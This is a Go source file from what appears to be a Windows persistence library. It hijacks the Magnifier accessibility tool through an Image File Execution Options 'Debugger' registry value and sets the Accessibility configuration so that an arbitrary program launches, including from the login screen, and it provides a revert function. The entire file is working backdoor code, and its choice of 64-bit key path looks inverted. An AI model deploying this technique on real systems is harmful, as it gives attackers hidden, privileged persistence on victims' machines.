// Copyright (c) 2019-2022 0x9ef. All rights reserved.
// Use of this source code is governed by an MIT license
// that can be found in the LICENSE file.
package persist

import (
	"errors"
	"strconv"

	"golang.org/x/sys/windows/registry"
)

type ExecutorMagnifier struct{}

func (e ExecutorMagnifier) findKey() (string, error) {
	var key string
	if strconv.IntSize == 32 {
		key = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe"
	} else if strconv.IntSize == 64 {
		key = "Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe"
	} else {
		return "<nil>", errors.New("unknown architecture, cannot find MAGNIFIER path")
	}
	return key, nil
}

func (e ExecutorMagnifier) Exec(path string) error {
	kpath, err := e.findKey()
	if err != nil {
		return err
	}

	k, exists, err := registry.CreateKey(registry.LOCAL_MACHINE, kpath, registry.ALL_ACCESS)
	if err != nil && !exists {
		return err
	}
	defer k.Close()
	if err = k.SetStringValue("Debugger", path); err != nil {
		return err
	}

	k1, exists, err := registry.CreateKey(registry.LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility", registry.ALL_ACCESS)
	if err != nil && !exists {
		return err
	}
	defer k1.Close()
	err = k1.SetStringValue("Configuration", "magnifierpane")
	return nil
}

func (e ExecutorMagnifier) Revert() error {
	kpath, err := e.findKey()
	if err != nil {
		return err
	}
	if err := registry.DeleteKey(registry.LOCAL_MACHINE, kpath); err != nil {
		return err
	}
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility", registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer k.Close()
	err = k.DeleteValue("Configuration")
	return err
}
